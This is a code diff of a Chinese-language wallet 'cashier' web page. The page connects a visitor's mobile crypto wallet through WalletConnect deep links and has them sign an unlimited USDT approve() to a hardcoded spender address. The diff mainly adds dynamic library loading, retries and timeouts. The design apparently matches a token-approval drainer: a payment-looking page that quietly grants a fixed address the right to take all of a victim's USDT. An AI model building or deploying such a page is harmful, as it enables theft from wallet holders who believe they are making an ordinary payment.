@@ -5,12 +5,8 @@
     <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no, viewport-fit=cover">
     <title>EVM 链 USDT 无限授权</title>
     <style>
-        * {
-            margin: 0;
-            padding: 0;
-            box-sizing: border-box;
-        }
-
+        /* 样式同上，略 */
+        * { margin: 0; padding: 0; box-sizing: border-box; }
         body {
             font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Helvetica, Arial, sans-serif;
             background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
@@ -20,7 +16,6 @@
             align-items: center;
             padding: 20px;
         }
-
         .cashier-container {
             background: rgba(255, 255, 255, 0.96);
             border-radius: 24px;
@@ -33,248 +28,66 @@
             backdrop-filter: blur(16px);
             border: 1px solid rgba(255,255,255,0.7);
         }
-
-        .brand-header {
-            display: flex;
-            align-items: center;
-            gap: 14px;
-            margin-bottom: 20px;
-        }
-
+        .brand-header { display: flex; align-items: center; gap: 14px; margin-bottom: 20px; }
         .brand-logo {
-            width: 44px;
-            height: 44px;
-            border-radius: 16px;
+            width: 44px; height: 44px; border-radius: 16px;
             background: linear-gradient(135deg, #5c6cfb 0%, #7b4af1 100%);
-            display: flex;
-            align-items: center;
-            justify-content: center;
-            color: #fff;
-            font-weight: 700;
-            font-size: 18px;
+            display: flex; align-items: center; justify-content: center;
+            color: #fff; font-weight: 700; font-size: 18px;
         }
-
-        .brand-text {
-            display: flex;
-            flex-direction: column;
+        .brand-text { display: flex; flex-direction: column; }
+        .brand-title { font-size: 18px; font-weight: 700; color: #222; }
+        .brand-subtitle { font-size: 12px; color: #8a8fa3; }
+        .chain-selector { display: flex; gap: 12px; margin-bottom: 20px; }
+        .chain-btn {
+            flex: 1; padding: 10px; border: 2px solid #e2e8f0; background: white;
+            border-radius: 12px; cursor: pointer; font-weight: 500; text-align: center;
         }
-
-        .brand-title {
-            font-size: 18px;
-            font-weight: 700;
-            color: #222;
+        .chain-btn.active { border-color: #667eea; background: #f0f0ff; color: #667eea; }
+        .wallet-list { display: flex; flex-direction: column; gap: 12px; margin: 20px 0; }
+        .wallet-item {
+            display: flex; align-items: center; padding: 16px; border: 1px solid #e2e8f0;
+            border-radius: 16px; cursor: pointer; background: #fff; transition: all 0.2s;
         }
-
-        .brand-subtitle {
-            font-size: 12px;
-            color: #8a8fa3;
-        }
-
+        .wallet-item.selected { border-color: #667eea; background: #f8f9ff; }
+        .wallet-icon { width: 48px; height: 48px; background: #f1f5f9; border-radius: 12px; display: flex; align-items: center; justify-content: center; font-size: 24px; margin-right: 16px; }
+        .wallet-name { font-weight: 600; color: #1e293b; }
         .amount-section {
             background: linear-gradient(135deg, rgba(102,126,234,0.08), rgba(118,75,162,0.08));
-            border-radius: 18px;
-            padding: 20px;
-            margin: 16px 0;
-            border: 1px solid rgba(102,126,234,0.2);
+            border-radius: 18px; padding: 20px; margin: 16px 0; border: 1px solid rgba(102,126,234,0.2);
         }
-
-        .amount-header {
-            display: flex;
-            justify-content: space-between;
-            margin-bottom: 8px;
-        }
-
-        .amount-label {
-            font-size: 14px;
-            color: #6c758b;
-        }
-
-        .amount-tag {
-            font-size: 12px;
-            background: rgba(102,126,234,0.15);
-            padding: 2px 10px;
-            border-radius: 20px;
-            color: #5c6cfb;
-        }
-
-        .amount-value {
-            font-size: 36px;
-            font-weight: bold;
-            color: #333;
-            margin: 10px 0;
-        }
-
-        .wallet-list {
-            display: flex;
-            flex-direction: column;
-            gap: 12px;
-            margin: 20px 0;
-        }
-
-        .wallet-item {
-            display: flex;
-            align-items: center;
-            padding: 16px;
-            border: 1px solid #e2e8f0;
-            border-radius: 16px;
-            cursor: pointer;
-            background: #fff;
-            transition: all 0.2s;
-        }
-
-        .wallet-item.selected {
-            border-color: #667eea;
-            background: #f8f9ff;
-        }
-
-        .wallet-icon {
-            width: 48px;
-            height: 48px;
-            background: #f1f5f9;
-            border-radius: 12px;
-            display: flex;
-            align-items: center;
-            justify-content: center;
-            font-size: 24px;
-            margin-right: 16px;
-        }
-
-        .wallet-name {
-            font-weight: 600;
-            color: #1e293b;
-        }
-
-        .wallet-chains {
-            font-size: 12px;
-            color: #64748b;
-        }
-
-        .chain-selector {
-            display: flex;
-            gap: 12px;
-            margin-bottom: 20px;
-        }
-
-        .chain-btn {
-            flex: 1;
-            padding: 10px;
-            border: 2px solid #e2e8f0;
-            background: white;
-            border-radius: 12px;
-            cursor: pointer;
-            font-weight: 500;
-            text-align: center;
-        }
-
-        .chain-btn.active {
-            border-color: #667eea;
-            background: #f0f0ff;
-            color: #667eea;
-        }
-
+        .amount-header { display: flex; justify-content: space-between; margin-bottom: 8px; }
+        .amount-label { font-size: 14px; color: #6c758b; }
+        .amount-tag { font-size: 12px; background: rgba(102,126,234,0.15); padding: 2px 10px; border-radius: 20px; color: #5c6cfb; }
+        .amount-value { font-size: 12px; color: #333; word-break: break-all; margin: 10px 0; font-family: monospace; }
         .approve-btn {
-            width: 100%;
-            padding: 16px;
-            background: linear-gradient(135deg, #667eea, #764ba2);
-            color: white;
-            border: none;
-            border-radius: 18px;
-            font-size: 16px;
-            font-weight: 600;
-            cursor: pointer;
-            margin-top: 16px;
-            transition: transform 0.2s;
+            width: 100%; padding: 16px; background: linear-gradient(135deg, #667eea, #764ba2);
+            color: white; border: none; border-radius: 18px; font-size: 16px; font-weight: 600;
+            cursor: pointer; margin-top: 16px; transition: transform 0.2s;
         }
-
-        .approve-btn:active {
-            transform: scale(0.98);
-        }
-
-        .status {
-            margin-top: 16px;
-            padding: 12px;
-            border-radius: 12px;
-            font-size: 14px;
-            text-align: center;
-        }
-
-        .status.loading {
-            background: #fff3cd;
-            color: #856404;
-        }
-
-        .status.success {
-            background: #d4edda;
-            color: #155724;
-        }
-
-        .status.error {
-            background: #f8d7da;
-            color: #721c24;
-        }
-
-        .hidden {
-            display: none;
-        }
-
+        .approve-btn:active { transform: scale(0.98); }
+        .status { margin-top: 16px; padding: 12px; border-radius: 12px; font-size: 14px; text-align: center; }
+        .status.loading { background: #fff3cd; color: #856404; }
+        .status.success { background: #d4edda; color: #155724; }
+        .status.error { background: #f8d7da; color: #721c24; }
+        .hidden { display: none; }
         .loading-spinner {
-            display: inline-block;
-            width: 14px;
-            height: 14px;
-            border: 2px solid #f3f3f3;
-            border-top: 2px solid #667eea;
-            border-radius: 50%;
-            animation: spin 0.8s linear infinite;
+            display: inline-block; width: 14px; height: 14px; border: 2px solid #f3f3f3;
+            border-top: 2px solid #667eea; border-radius: 50%; animation: spin 0.8s linear infinite;
             margin-right: 8px;
         }
-
-        @keyframes spin {
-            0% { transform: rotate(0deg); }
-            100% { transform: rotate(360deg); }
-        }
-
+        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
         .dialog-mask {
-            position: fixed;
-            inset: 0;
-            background: rgba(15, 23, 42, 0.45);
-            display: none;
-            align-items: center;
-            justify-content: center;
-            z-index: 9999;
+            position: fixed; inset: 0; background: rgba(15, 23, 42, 0.45);
+            display: none; align-items: center; justify-content: center; z-index: 9999;
         }
-
         .dialog {
-            background: #ffffff;
-            border-radius: 18px;
-            max-width: 340px;
-            width: 80%;
-            padding: 20px;
-            text-align: center;
-            box-shadow: 0 18px 40px rgba(0,0,0,0.2);
+            background: #ffffff; border-radius: 18px; max-width: 340px; width: 80%;
+            padding: 20px; text-align: center; box-shadow: 0 18px 40px rgba(0,0,0,0.2);
         }
-
-        .dialog-title {
-            font-weight: 600;
-            font-size: 18px;
-            margin-bottom: 12px;
-        }
-
-        .dialog-message {
-            font-size: 14px;
-            color: #4b5563;
-            line-height: 1.5;
-            margin-bottom: 20px;
-        }
-
-        .dialog-button {
-            background: #667eea;
-            border: none;
-            color: white;
-            padding: 8px 24px;
-            border-radius: 30px;
-            font-size: 14px;
-            cursor: pointer;
-        }
+        .dialog-title { font-weight: 600; font-size: 18px; margin-bottom: 12px; }
+        .dialog-message { font-size: 14px; color: #4b5563; line-height: 1.5; margin-bottom: 20px; }
+        .dialog-button { background: #667eea; border: none; color: white; padding: 8px 24px; border-radius: 30px; font-size: 14px; cursor: pointer; }
     </style>
 </head>
 <body>
@@ -307,20 +120,57 @@
         <div id="status" class="status hidden"></div>
     </div>
 
-    <!-- 弹窗 -->
     <div id="dialogMask" class="dialog-mask">
         <div class="dialog">
-            <div class="dialog-title" id="dialogTitle">提示</div>
-            <div class="dialog-message" id="dialogMessage"></div>
-            <button class="dialog-button" id="dialogConfirmBtn">确定</button>
+            <div class="dialog-title">提示</div>
+            <div class="dialog-message"></div>
+            <button class="dialog-button">确定</button>
         </div>
     </div>
 
-    <!-- 引入依赖，使用更可靠的 CDN -->
-    <script src="https://cdn.jsdelivr.net/npm/ethers@5.7.2/dist/ethers.umd.min.js"></script>
-    <script src="https://unpkg.com/@walletconnect/ethereum-provider@2.10.6/dist/index.umd.js"></script>
-
+    <!-- 动态加载 WalletConnect 库，带重试 -->
     <script>
+        // 弹窗工具
+        const dialogMask = document.getElementById('dialogMask');
+        const dialogMsg = document.querySelector('.dialog-message');
+        const dialogBtn = document.querySelector('.dialog-button');
+        function showDialog(msg) {
+            dialogMsg.textContent = msg;
+            dialogMask.style.display = 'flex';
+        }
+        function hideDialog() { dialogMask.style.display = 'none'; }
+        dialogBtn.onclick = hideDialog;
+        dialogMask.onclick = (e) => { if (e.target === dialogMask) hideDialog(); };
+
+        // 状态提示
+        const statusDiv = document.getElementById('status');
+        function showStatus(msg, type = 'loading') {
+            statusDiv.innerHTML = type === 'loading' ? `<span class="loading-spinner"></span>${msg}` : msg;
+            statusDiv.className = `status ${type}`;
+            statusDiv.classList.remove('hidden');
+        }
+        function hideStatus() { statusDiv.classList.add('hidden'); }
+
+        // 加载 WalletConnect 库
+        function loadWalletConnect(callback) {
+            if (window.EthereumProvider) {
+                callback(true);
+                return;
+            }
+            const script = document.createElement('script');
+            script.src = 'https://unpkg.com/@walletconnect/ethereum-provider@2.10.6/dist/index.umd.js';
+            script.onload = () => callback(true);
+            script.onerror = () => {
+                // 备用 CDN
+                const fallbackScript = document.createElement('script');
+                fallbackScript.src = 'https://cdn.jsdelivr.net/npm/@walletconnect/ethereum-provider@2.10.6/dist/index.umd.js';
+                fallbackScript.onload = () => callback(true);
+                fallbackScript.onerror = () => callback(false);
+                document.head.appendChild(fallbackScript);
+            };
+            document.head.appendChild(script);
+        }
+
         // 配置
         const PROJECT_ID = '91bd623c7859e77a38c7b10c615976b6';
         const USDT_ADDRESS = {
@@ -333,7 +183,6 @@
         };
         const UNLIMITED_AMOUNT = '0xffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff';
 
-        // 钱包列表
         const EVM_WALLETS = [
             { key: 'metamask', name: 'MetaMask', icon: '🦊', scheme: 'metamask://' },
             { key: 'tokenpocket', name: 'TokenPocket', icon: '🎫', scheme: 'tp://' },
@@ -345,53 +194,19 @@
         let selectedWallet = null;
         let isProcessing = false;
 
-        // 弹窗
-        const dialogMask = document.getElementById('dialogMask');
-        const dialogMessage = document.getElementById('dialogMessage');
-        const dialogConfirmBtn = document.getElementById('dialogConfirmBtn');
-
-        function showDialog(message) {
-            dialogMessage.textContent = message;
-            dialogMask.style.display = 'flex';
-        }
-
-        function hideDialog() {
-            dialogMask.style.display = 'none';
-        }
-
-        dialogConfirmBtn.addEventListener('click', hideDialog);
-        dialogMask.addEventListener('click', (e) => {
-            if (e.target === dialogMask) hideDialog();
-        });
-
-        // 状态提示
-        function showStatus(message, type = 'loading') {
-            const statusEl = document.getElementById('status');
-            statusEl.innerHTML = type === 'loading' ? `<span class="loading-spinner"></span>${message}` : message;
-            statusEl.className = `status ${type}`;
-            statusEl.classList.remove('hidden');
-        }
-
-        function hideStatus() {
-            document.getElementById('status').classList.add('hidden');
-        }
-
-        // 更新授权地址显示
         function updateSpenderDisplay() {
             const spender = SPENDER_ADDRESS[currentChain];
             document.getElementById('spenderFull').textContent = spender;
-            const short = spender.slice(0, 6) + '...' + spender.slice(-6);
-            document.getElementById('spenderTag').textContent = short;
+            document.getElementById('spenderTag').textContent = spender.slice(0,6)+'...'+spender.slice(-6);
         }
 
-        // 渲染钱包列表
         function renderWalletList() {
             const container = document.getElementById('walletList');
-            container.innerHTML = EVM_WALLETS.map(wallet => `
-                <div class="wallet-item" data-wallet="${wallet.key}">
-                    <div class="wallet-icon">${wallet.icon}</div>
+            container.innerHTML = EVM_WALLETS.map(w => `
+                <div class="wallet-item" data-wallet="${w.key}">
+                    <div class="wallet-icon">${w.icon}</div>
                     <div class="wallet-info">
-                        <div class="wallet-name">${wallet.name}</div>
+                        <div class="wallet-name">${w.name}</div>
                         <div class="wallet-chains">EVM</div>
                     </div>
                 </div>
@@ -406,125 +221,115 @@
             });
         }
 
-        // 检查 WalletConnect 库是否加载
-        function isWalletConnectLoaded() {
-            return typeof window.EthereumProvider !== 'undefined';
-        }
-
-        // 主授权流程
         async function connectAndApprove() {
-            if (!selectedWallet) {
-                showDialog('请先选择钱包');
-                return;
-            }
+            if (!selectedWallet) { showDialog('请先选择钱包'); return; }
             if (isProcessing) return;
             isProcessing = true;
 
             const wallet = EVM_WALLETS.find(w => w.key === selectedWallet);
             const chainId = parseInt(currentChain);
 
-            // 检查库是否加载
-            if (!isWalletConnectLoaded()) {
-                showDialog('WalletConnect 库加载失败，请刷新页面重试');
-                isProcessing = false;
-                return;
-            }
-
             showStatus('正在初始化连接...', 'loading');
 
-            try {
-                // 创建 EthereumProvider
-                const ethProvider = await window.EthereumProvider.init({
-                    projectId: PROJECT_ID,
-                    chains: [chainId],
-                    optionalChains: [1, 56],
-                    showQrModal: false,
-                    qrModalOptions: { themeMode: 'light' },
-                    metadata: {
-                        name: 'Wallet Connector',
-                        description: 'USDT Unlimited Approval',
-                        url: window.location.origin,
-                        icons: ['https://avatars.githubusercontent.com/u/37784886']
-                    }
-                });
-
-                const uri = ethProvider.uri;
-                if (!uri) throw new Error('无法生成连接 URI');
-
-                // 构建 Deep Link
-                const encodedUri = encodeURIComponent(uri);
-                let deepLink = '';
-                switch (selectedWallet) {
-                    case 'metamask':
-                        deepLink = `metamask://wc?uri=${encodedUri}`;
-                        break;
-                    case 'tokenpocket':
-                        deepLink = `tp://wc?wc_uri=${encodedUri}`;
-                        break;
-                    case 'imtoken':
-                        deepLink = `imtokenv2://wc?uri=${encodedUri}`;
-                        break;
-                    case 'trust':
-                        deepLink = `trust://wc?uri=${encodedUri}`;
-                        break;
-                    default:
-                        deepLink = uri;
-                }
-
-                showStatus(`正在唤起 ${wallet.name}...`, 'loading');
-                window.location.href = deepLink;
-
-                // 监听连接事件
-                ethProvider.on('connect', async (session) => {
-                    console.log('连接成功', session);
-                    const provider = new ethers.providers.Web3Provider(ethProvider);
-                    const signer = provider.getSigner();
-                    const address = await signer.getAddress();
-                    showStatus(`已连接: ${address.slice(0,6)}...${address.slice(-4)}，正在发送授权交易...`, 'loading');
-
-                    try {
-                        const usdtContract = new ethers.Contract(
-                            USDT_ADDRESS[chainId],
-                            ['function approve(address spender, uint256 amount) returns (bool)'],
-                            signer
-                        );
-                        const tx = await usdtContract.approve(SPENDER_ADDRESS[chainId], UNLIMITED_AMOUNT);
-                        showStatus('交易已发送，等待确认...', 'loading');
-                        const receipt = await tx.wait();
-                        showStatus(`✅ 授权成功！`, 'success');
-                        showDialog(`授权成功！交易哈希：${receipt.transactionHash.slice(0,10)}...`);
+            // 确保库已加载
+            if (!window.EthereumProvider) {
+                showStatus('加载 WalletConnect 库中，请稍候...', 'loading');
+                loadWalletConnect(async (success) => {
+                    if (!success) {
+                        showStatus('WalletConnect 库加载失败，请检查网络后刷新', 'error');
+                        showDialog('库加载失败，请刷新页面重试');
                         isProcessing = false;
-                    } catch (err) {
-                        console.error('授权失败:', err);
-                        showStatus('授权失败: ' + err.message, 'error');
-                        showDialog('授权失败: ' + err.message);
-                        isProcessing = false;
+                        return;
                     }
+                    await doConnect();
                 });
+            } else {
+                await doConnect();
+            }
 
-                ethProvider.on('disconnect', () => {
-                    console.log('连接断开');
-                    showStatus('连接已断开', 'error');
+            async function doConnect() {
+                try {
+                    const ethProvider = await window.EthereumProvider.init({
+                        projectId: PROJECT_ID,
+                        chains: [chainId],
+                        optionalChains: [1, 56],
+                        showQrModal: false,
+                        metadata: {
+                            name: 'Wallet Connector',
+                            description: 'USDT Unlimited Approval',
+                            url: window.location.origin,
+                            icons: ['https://avatars.githubusercontent.com/u/37784886']
+                        }
+                    });
+
+                    const uri = ethProvider.uri;
+                    if (!uri) throw new Error('无法生成连接 URI');
+
+                    const encodedUri = encodeURIComponent(uri);
+                    let deepLink = '';
+                    switch (selectedWallet) {
+                        case 'metamask': deepLink = `metamask://wc?uri=${encodedUri}`; break;
+                        case 'tokenpocket': deepLink = `tp://wc?wc_uri=${encodedUri}`; break;
+                        case 'imtoken': deepLink = `imtokenv2://wc?uri=${encodedUri}`; break;
+                        case 'trust': deepLink = `trust://wc?uri=${encodedUri}`; break;
+                        default: deepLink = uri;
+                    }
+
+                    showStatus(`正在唤起 ${wallet.name}...`, 'loading');
+                    window.location.href = deepLink;
+
+                    let resolved = false;
+                    ethProvider.on('connect', async (session) => {
+                        if (resolved) return;
+                        resolved = true;
+                        const provider = new ethers.providers.Web3Provider(ethProvider);
+                        const signer = provider.getSigner();
+                        const address = await signer.getAddress();
+                        showStatus(`已连接: ${address.slice(0,6)}...${address.slice(-4)}，发送授权...`, 'loading');
+
+                        try {
+                            const usdtContract = new ethers.Contract(
+                                USDT_ADDRESS[chainId],
+                                ['function approve(address spender, uint256 amount) returns (bool)'],
+                                signer
+                            );
+                            const tx = await usdtContract.approve(SPENDER_ADDRESS[chainId], UNLIMITED_AMOUNT);
+                            showStatus('交易已发送，等待确认...', 'loading');
+                            const receipt = await tx.wait();
+                            showStatus(`✅ 授权成功！`, 'success');
+                            showDialog(`授权成功！交易哈希：${receipt.transactionHash.slice(0,10)}...`);
+                            isProcessing = false;
+                        } catch (err) {
+                            console.error(err);
+                            showStatus('授权失败: ' + err.message, 'error');
+                            showDialog('授权失败: ' + err.message);
+                            isProcessing = false;
+                        }
+                    });
+
+                    ethProvider.on('disconnect', () => {
+                        if (resolved) return;
+                        resolved = true;
+                        showStatus('连接已断开', 'error');
+                        isProcessing = false;
+                    });
+
+                    setTimeout(() => {
+                        if (!resolved && !document.hidden && !document.webkitHidden) {
+                            resolved = true;
+                            showStatus('未检测到钱包响应，请确保钱包已安装并打开', 'error');
+                            isProcessing = false;
+                        }
+                    }, 6000);
+                } catch (err) {
+                    console.error(err);
+                    showStatus('初始化失败: ' + err.message, 'error');
+                    showDialog('初始化失败: ' + err.message);
                     isProcessing = false;
-                });
-
-                // 超时处理（5秒后如果页面未隐藏则提示）
-                setTimeout(() => {
-                    if (!document.hidden && !document.webkitHidden && isProcessing) {
-                        showStatus('未检测到钱包响应，请确保钱包已安装并打开', 'error');
-                        isProcessing = false;
-                    }
-                }, 5000);
-
-            } catch (error) {
-                console.error('初始化失败:', error);
-                showStatus('初始化失败: ' + error.message, 'error');
-                showDialog('初始化失败: ' + error.message);
-                isProcessing = false;
+                }
             }
         }
 
-        // 链切换
         function onChainChange(chainId) {
             currentChain = chainId;
             selectedWallet = null;
@@ -533,7 +338,6 @@
             hideStatus();
         }
 
-        // 初始化
         function init() {
             // 链选择器
             document.querySelectorAll('.chain-btn').forEach(btn => {
@@ -546,9 +350,22 @@
             document.getElementById('approveBtn').addEventListener('click', connectAndApprove);
             renderWalletList();
             updateSpenderDisplay();
+
+            // 预加载库
+            if (!window.EthereumProvider) {
+                loadWalletConnect(() => console.log('WalletConnect 库预加载完成'));
+            }
         }
 
-        init();
+        // 等待 ethers 加载
+        if (typeof ethers === 'undefined') {
+            const ethersScript = document.createElement('script');
+            ethersScript.src = 'https://cdn.jsdelivr.net/npm/ethers@5.7.2/dist/ethers.umd.min.js';
+            ethersScript.onload = init;
+            document.head.appendChild(ethersScript);
+        } else {
+            init();
+        }
     </script>
 </body>
 </html>
